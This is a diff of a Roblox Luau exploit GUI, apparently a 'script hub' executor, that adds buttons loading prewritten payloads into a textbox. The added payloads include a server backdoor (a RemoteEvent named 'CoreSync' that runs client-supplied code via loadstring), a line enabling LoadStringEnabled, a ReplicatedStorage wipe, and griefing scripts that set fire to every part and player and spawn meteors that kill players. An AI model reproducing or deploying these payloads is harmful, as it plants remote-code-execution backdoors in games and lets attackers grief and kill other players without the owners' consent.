-G2L["4a"] = Instance.new("LocalScript", G2L["48"]);
+G2L["51"] = Instance.new("LocalScript", G2L["4f"]);
 
 
 
 -- StarterGui.ScreenGui.Frame.LabelFrame
-G2L["4b"] = Instance.new("Frame", G2L["4"]);
-G2L["4b"]["BorderSizePixel"] = 0;
-G2L["4b"]["BackgroundColor3"] = Color3.fromRGB(37, 37, 37);
-G2L["4b"]["Size"] = UDim2.new(0, 201, 0, 50);
-G2L["4b"]["Position"] = UDim2.new(0.35731, 0, 0.78378, 0);
-G2L["4b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["4b"]["Name"] = [[LabelFrame]];
+G2L["52"] = Instance.new("Frame", G2L["4"]);
+G2L["52"]["BorderSizePixel"] = 0;
+G2L["52"]["BackgroundColor3"] = Color3.fromRGB(37, 37, 37);
+G2L["52"]["Size"] = UDim2.new(0, 201, 0, 50);
+G2L["52"]["Position"] = UDim2.new(0.35731, 0, 0.78378, 0);
+G2L["52"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["52"]["Name"] = [[LabelFrame]];
 
 
 -- StarterGui.ScreenGui.Frame.LabelFrame.RemoteLabel
-G2L["4c"] = Instance.new("TextLabel", G2L["4b"]);
-G2L["4c"]["TextWrapped"] = true;
-G2L["4c"]["BorderSizePixel"] = 0;
-G2L["4c"]["TextSize"] = 14;
-G2L["4c"]["TextScaled"] = true;
-G2L["4c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["4c"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["4c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["4c"]["BackgroundTransparency"] = 1;
-G2L["4c"]["Size"] = UDim2.new(0, 200, 0, 50);
-G2L["4c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["4c"]["Text"] = [[]];
-G2L["4c"]["Name"] = [[RemoteLabel]];
+G2L["53"] = Instance.new("TextLabel", G2L["52"]);
+G2L["53"]["TextWrapped"] = true;
+G2L["53"]["BorderSizePixel"] = 0;
+G2L["53"]["TextSize"] = 14;
+G2L["53"]["TextScaled"] = true;
+G2L["53"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["53"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["53"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["53"]["BackgroundTransparency"] = 1;
+G2L["53"]["Size"] = UDim2.new(0, 200, 0, 50);
+G2L["53"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["53"]["Text"] = [[]];
+G2L["53"]["Name"] = [[RemoteLabel]];
 
 
 -- StarterGui.ScreenGui.LocalScript
@@ -1465,6 +1578,245 @@ local script = G2L["e"];
 	]]
 		end)
 	end
+	
+	local clearBtn = scriptHubFrame:FindFirstChild("clearrs")
+	if clearBtn and clearBtn:IsA("TextButton") then
+		clearBtn.MouseButton1Click:Connect(function()
+			textbox.Text = [[local replicatedStorage = game:GetService("ReplicatedStorage")
+	
+	for _, obj in ipairs(replicatedStorage:GetChildren()) do
+	    obj:Destroy()
+	end
+	
+	--WARNING! CLEARING REPLICATEDSTORAGE WILL DELETE THE BACKDOOR AND CAUSE THE SERVERSIDE TO NOT WORK! can be used against lalol hub skids tho LOL--
+	]]
+		end)
+	end
+	
+	local backdoorBtn = scriptHubFrame:FindFirstChild("backdoor")
+	if backdoorBtn and backdoorBtn:IsA("TextButton") then
+		backdoorBtn.MouseButton1Click:Connect(function()
+			textbox.Text = [[local remote = Instance.new("RemoteEvent")
+	remote.Name = "CoreSync"
+	remote.Parent = game.ReplicatedStorage
+	
+	remote.OnServerEvent:Connect(function(player, code)
+	    local success, err = pcall(function()
+	        loadstring(code)()
+	    end)
+	    if not success then
+	        warn("Execution failed:", err)
+	    end
+	end)
+	
+	--WARNING! RUNNING THIS CODE INJECTS A REMOTE EVENT AND A SERVER SIDE LISTENER THAT MAKES A BACKDOOR! USE AT YOUR OWN RISK!
+	]]
+		end)
+	end
+	
+	local stringBtn = scriptHubFrame:FindFirstChild("loadstring")
+	if stringBtn and stringBtn:IsA("TextButton") then
+		stringBtn.MouseButton1Click:Connect(function()
+			textbox.Text = [[game.ServerScriptService.LoadStringEnabled = true]]
+		end)
+	end
+	
+	local fireBtn = scriptHubFrame:FindFirstChild("fire")
+	if fireBtn and fireBtn:IsA("TextButton") then
+		fireBtn.MouseButton1Click:Connect(function()
+			textbox.Text = [[for _, v in pairs(workspace:GetDescendants()) do
+	    if v:IsA("BasePart") then
+	        Instance.new("Fire", v)
+	    end
+	end
+	]]
+		end)
+	end
+	
+	local fireringBtn = scriptHubFrame:FindFirstChild("firering")
+	if fireringBtn and fireringBtn:IsA("TextButton") then
+		fireringBtn.MouseButton1Click:Connect(function()
+			textbox.Text = [[local Players = game:GetService("Players")
+	local RunService = game:GetService("RunService")
+	
+	local orbitRadius = 10
+	local orbitSpeed = 2 * math.pi -- 1 full orbit per second
+	local partCount = 8
+	
+	for _, player in pairs(Players:GetPlayers()) do
+	    if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+	        local center = player.Character.HumanoidRootPart
+	        local parts = {}
+	
+	        -- Create orbiting parts
+	        for i = 1, partCount do
+	            local part = Instance.new("Part")
+	            part.Size = Vector3.new(1, 1, 1)
+	            part.Anchored = true
+	            part.CanCollide = false
+	            part.Transparency = 1
+	            part.Name = "OrbitFire"
+	            part.Parent = workspace
+	
+	            local fire = Instance.new("Fire")
+	            fire.Size = 7
+	            fire.Heat = 25
+	            fire.Parent = part
+	
+	            table.insert(parts, part)
+	        end
+	
+	        -- Orbit logic
+	        local startTime = tick()
+	        RunService.Heartbeat:Connect(function()
+	            local t = tick() - startTime
+	            for i, part in ipairs(parts) do
+	                local angle = (t * orbitSpeed + (2 * math.pi / partCount) * i)
+	                local offset = Vector3.new(math.cos(angle), 0, math.sin(angle)) * orbitRadius
+	                part.Position = center.Position + offset
+	            end
+	        end)
+	    end
+	end
+	]]
+		end)
+	end
+	
+	local fireAllBtn = scriptHubFrame:FindFirstChild("fireringall")
+	if fireAllBtn and fireAllBtn:IsA("TextButton") then
+		fireAllBtn.MouseButton1Click:Connect(function()
+			textbox.Text = [[local Players = game:GetService("Players")
+	local RunService = game:GetService("RunService")
+	
+	local orbitRadius = 10
+	local orbitSpeed = 2 * math.pi -- 1 full orbit per second
+	local partCount = 8
+	
+	local orbitData = {}
+	
+	-- Create orbiting parts for each player
+	for _, player in pairs(Players:GetPlayers()) do
+	    if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+	        local center = player.Character.HumanoidRootPart
+	        local parts = {}
+	
+	        for i = 1, partCount do
+	            local part = Instance.new("Part")
+	            part.Size = Vector3.new(1, 1, 1)
+	            part.Anchored = true
+	            part.CanCollide = false
+	            part.Transparency = 1
+	            part.Name = "OrbitFire"
+	            part.Parent = workspace
+	
+	            local fire = Instance.new("Fire")
+	            fire.Size = 7
+	            fire.Heat = 25
+	            fire.Parent = part
+	
+	            table.insert(parts, part)
+	        end
+	
+	        orbitData[player] = {
+	            center = center,
+	            parts = parts,
+	            startTime = tick()
+	        }
+	    end
+	end
+	
+	-- Orbit logic for all players
+	RunService.Heartbeat:Connect(function()
+	    for player, data in pairs(orbitData) do
+	        if player.Character and data.center then
+	            local t = tick() - data.startTime
+	            for i, part in ipairs(data.parts) do
+	                local angle = (t * orbitSpeed + (2 * math.pi / partCount) * i)
+	                local offset = Vector3.new(math.cos(angle), 0, math.sin(angle)) * orbitRadius
+	                part.Position = data.center.Position + offset
+	            end
+	        end
+	    end
+	end)
+	]]
+		end)
+	end
+	
+	local meteorBtn = scriptHubFrame:FindFirstChild("meteor")
+	if meteorBtn and meteorBtn:IsA("TextButton") then
+		meteorBtn.MouseButton1Click:Connect(function()
+			textbox.Text = [[local Players = game:GetService("Players")
+	local Debris = game:GetService("Debris")
+	
+	local duration = 30 -- seconds
+	local spawnRate = 0.2 -- seconds between meteors
+	local meteorSize = Vector3.new(20, 20, 20)
+	local fireSize = 20
+	local fireHeat = 25
+	local killRadius = 14
+	
+	local function spawnMeteor()
+	    local targetOrigin = math.random() > 0.55 -- 45% chance to target origin zone
+	    local x, z
+	
+	    if targetOrigin then
+	        x = math.random(-30, 30)
+	        z = math.random(-30, 30)
+	    else
+	        x = math.random(-500, 500)
+	        z = math.random(-500, 500)
+	    end
+	
+	    local meteor = Instance.new("Part")
+	    meteor.Size = meteorSize
+	    meteor.Shape = Enum.PartType.Ball
+	    meteor.Material = Enum.Material.CrackedLava
+	    meteor.Anchored = false
+	    meteor.CanCollide = true
+	    meteor.Position = Vector3.new(x, 150, z)
+	    meteor.Name = "Meteor"
+	    meteor.Parent = workspace
+	
+	    local fire = Instance.new("Fire")
+	    fire.Size = fireSize
+	    fire.Heat = fireHeat
+	    fire.Parent = meteor
+	
+	    meteor.Touched:Connect(function(hit)
+	        if not meteor:IsDescendantOf(workspace) then return end
+	
+	        local explosion = Instance.new("Explosion")
+	        explosion.Position = meteor.Position
+	        explosion.BlastRadius = 0 -- no default damage
+	        explosion.Parent = workspace
+	
+	        for _, player in pairs(Players:GetPlayers()) do
+	            if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+	                local dist = (player.Character.HumanoidRootPart.Position - meteor.Position).Magnitude
+	                if dist <= killRadius then
+	                    local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
+	                    if humanoid then
+	                        humanoid.Health = 0
+	                    end
+	                end
+	            end
+	        end
+	
+	        meteor:Destroy()
+	    end)
+	
+	    Debris:AddItem(meteor, 10)
+	end
+	
+	
+	local startTime = tick()
+	while tick() - startTime < duration do
+	    spawnMeteor()
+	    task.wait(spawnRate)
+	end
+	]]
+		end)
+	end
 end;
 task.spawn(C_e);
 -- StarterGui.ScreenGui.Frame.ScriptHubFrame.LocalScript
@@ -1476,8 +1828,8 @@ local script = G2L["f"];
 end;
 task.spawn(C_f);
 -- StarterGui.ScreenGui.Frame.Execute.LocalScript
-local function C_2e()
-local script = G2L["2e"];
+local function C_35()
+local script = G2L["35"];
 	local button = script.Parent
 	local player = game:GetService("Players").LocalPlayer
 	local mouse = player:GetMouse()
@@ -1517,10 +1869,10 @@ local script = G2L["2e"];
 		end
 	end)
 end;
-task.spawn(C_2e);
+task.spawn(C_35);
 -- StarterGui.ScreenGui.Frame.Clear.LocalScript
-local function C_30()
-local script = G2L["30"];
+local function C_37()
+local script = G2L["37"];
 	local button = script.Parent
 	local player = game:GetService("Players").LocalPlayer
 	local mouse = player:GetMouse()
@@ -1560,10 +1912,10 @@ local script = G2L["30"];
 		end
 	end)
 end;
-task.spawn(C_30);
+task.spawn(C_37);
 -- StarterGui.ScreenGui.Frame.Inject.LocalScript
-local function C_32()
-local script = G2L["32"];
+local function C_39()
+local script = G2L["39"];
 	local button = script.Parent
 	local StarterGui = game:GetService("StarterGui")
 	
@@ -1585,10 +1937,10 @@ local script = G2L["32"];
 		})
 	end)
 end;
-task.spawn(C_32);
+task.spawn(C_39);
 -- StarterGui.ScreenGui.Frame.Inject.LocalScript
-local function C_33()
-local script = G2L["33"];
+local function C_3a()
+local script = G2L["3a"];
 	-- Place this LocalScript inside your TextButton
 	local button = script.Parent
 	local screenGui = button.Parent
@@ -1623,10 +1975,10 @@ local script = G2L["33"];
 		end
 	end)
 end;
-task.spawn(C_33);
+task.spawn(C_3a);
 -- StarterGui.ScreenGui.Frame.Inject.LocalScript
-local function C_34()
-local script = G2L["34"];
+local function C_3b()
+local script = G2L["3b"];
 	local button = script.Parent
 	local player = game:GetService("Players").LocalPlayer
 	local mouse = player:GetMouse()
@@ -1666,10 +2018,10 @@ local script = G2L["34"];
 		end
 	end)
 end;
-task.spawn(C_34);
+task.spawn(C_3b);
 -- StarterGui.ScreenGui.Frame.Inject.LocalScript
-local function C_35()
-local script = G2L["35"];
+local function C_3c()
+local script = G2L["3c"];
 	local button = script.Parent
 	
 	button.MouseButton1Click:Connect(function()
@@ -1688,10 +2040,10 @@ local script = G2L["35"];
 		remoteLabel.Text = "Check console for results"
 	end)
 end;
-task.spawn(C_35);
+task.spawn(C_3c);
 -- StarterGui.ScreenGui.Frame.ImageButton.LocalScript
-local function C_37()
-local script = G2L["37"];
+local function C_3e()
+local script = G2L["3e"];
 	local button = script.Parent
 	
 	button.MouseButton1Click:Connect(function()
@@ -1704,10 +2056,10 @@ local script = G2L["37"];
 		end
 	end)
 end;
-task.spawn(C_37);
+task.spawn(C_3e);
 -- StarterGui.ScreenGui.Frame.ImageButton.LocalScript
-local function C_38()
-local script = G2L["38"];
+local function C_3f()
+local script = G2L["3f"];
 	local button = script.Parent
 	local player = game:GetService("Players").LocalPlayer
 	local mouse = player:GetMouse()
@@ -1746,10 +2098,10 @@ local script = G2L["38"];
 		end
 	end)
 end;
-task.spawn(C_38);
+task.spawn(C_3f);
 -- StarterGui.ScreenGui.Frame.ImageButton.LocalScript
-local function C_3a()
-local script = G2L["3a"];
+local function C_41()
+local script = G2L["41"];
 	local button = script.Parent
 	
 	button.MouseButton1Click:Connect(function()
@@ -1760,10 +2112,10 @@ local script = G2L["3a"];
 		end
 	end)
 end;
-task.spawn(C_3a);
+task.spawn(C_41);
 -- StarterGui.ScreenGui.Frame.ImageButton.LocalScript
-local function C_3b()
-local script = G2L["3b"];
+local function C_42()
+local script = G2L["42"];
 	local button = script.Parent
 	local player = game:GetService("Players").LocalPlayer
 	local mouse = player:GetMouse()
@@ -1802,10 +2154,10 @@ local script = G2L["3b"];
 		end
 	end)
 end;
-task.spawn(C_3b);
+task.spawn(C_42);
 -- StarterGui.ScreenGui.Frame.ImageButton.LocalScript
-local function C_3e()
-local script = G2L["3e"];
+local function C_45()
+local script = G2L["45"];
 	local button = script.Parent
 	local parentFrame = button.Parent
 	local scriptHub = parentFrame:WaitForChild("ScriptHubFrame")
@@ -1814,10 +2166,10 @@ local script = G2L["3e"];
 		scriptHub.Visible = not scriptHub.Visible
 	end)
 end;
-task.spawn(C_3e);
+task.spawn(C_45);
 -- StarterGui.ScreenGui.Frame.ImageButton.LocalScript
-local function C_3f()
-local script = G2L["3f"];
+local function C_46()
+local script = G2L["46"];
 	local button = script.Parent
 	local player = game:GetService("Players").LocalPlayer
 	local mouse = player:GetMouse()
@@ -1856,10 +2208,10 @@ local script = G2L["3f"];
 		end
 	end)
 end;
-task.spawn(C_3f);
+task.spawn(C_46);
 -- StarterGui.ScreenGui.Frame.ImageButton.LocalScript
-local function C_49()
-local script = G2L["49"];
+local function C_50()
+local script = G2L["50"];
 	local button = script.Parent
 	local screenGui = button:FindFirstAncestorOfClass("ScreenGui")
 	
@@ -1869,10 +2221,10 @@ local script = G2L["49"];
 		end
 	end)
 end;
-task.spawn(C_49);
+task.spawn(C_50);
 -- StarterGui.ScreenGui.Frame.ImageButton.LocalScript
-local function C_4a()
-local script = G2L["4a"];
+local function C_51()
+local script = G2L["51"];
 	local button = script.Parent
 	local player = game:GetService("Players").LocalPlayer
 	local mouse = player:GetMouse()
@@ -1911,6 +2263,6 @@ local script = G2L["4a"];
 		end
 	end)
 end;
-task.spawn(C_4a);
+task.spawn(C_51);
 
 return G2L["1"], require;
